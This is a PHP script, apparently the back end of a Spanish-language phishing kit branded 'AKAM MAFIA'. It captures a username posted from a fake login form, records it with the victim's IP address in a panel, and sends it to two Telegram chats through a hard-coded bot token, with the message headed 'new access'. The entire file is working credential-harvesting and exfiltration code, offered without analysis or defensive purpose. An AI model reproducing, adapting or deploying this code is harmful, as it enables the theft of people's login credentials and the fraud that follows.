<?php
require_once('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$ip = $_SERVER['REMOTE_ADDR'];
// Capturamos el usuario que viene del formulario
$usuario = isset($_POST['usr']) ? $_POST['usr'] : 'No detectado'; 

if ($usuario != 'No detectado') {
    // 1. Guardar en el panel (Usuario y Clave inicial si la hay)
    if (function_exists('actualizar_registro')) {
        actualizar_registro($ip, "USUARIO", $usuario); 
    }

    // 2. Configuración del Bot 𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐
    $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
    $chat_ids = ["8114050673", "8518977918"]; 

    // 3. Formato del mensaje
    $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - NUEVO ACCESO</b> ⭐\n\n";
    $mensaje .= "👤 <b>USUARIO:</b> <code>" . $usuario . "</code>\n";
    $mensaje .= "📍 <b>IP:</b> <code>" . $ip . "</code>\n";
    $mensaje .= "⏰ <b>FECHA:</b> " . date('d/m/Y H:i:s') . "\n";
    $mensaje .= "━━━━━━━━━━━━━━━";

    // 4. Envío a Telegram
    foreach ($chat_ids as $id) {
        $url = "https://api.telegram.org/bot$token/sendMessage";
        $data = [
            'chat_id' => $id,
            'text' => $mensaje,
            'parse_mode' => 'HTML'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }
}
?>
